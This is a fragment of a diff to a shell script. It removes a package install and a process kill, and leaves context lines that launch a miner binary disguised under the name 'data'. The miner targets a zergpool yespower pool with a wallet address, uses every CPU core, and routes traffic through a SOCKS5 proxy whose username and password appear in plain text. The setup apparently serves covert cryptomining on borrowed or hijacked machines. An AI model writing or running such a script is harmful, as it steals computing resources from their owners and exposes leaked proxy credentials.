@@ -58,8 +58,6 @@ chmod +x data
 
 ph add data
 
-apt-get install psmisc
 
-pkill -9 -f "ping 127.0.0.1" 
 
 ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ.Test -p c=RVN -t $(nproc) -x socks5://mikrotik999:Elibawnos@gpusocks3.wot.mrface.com:1080
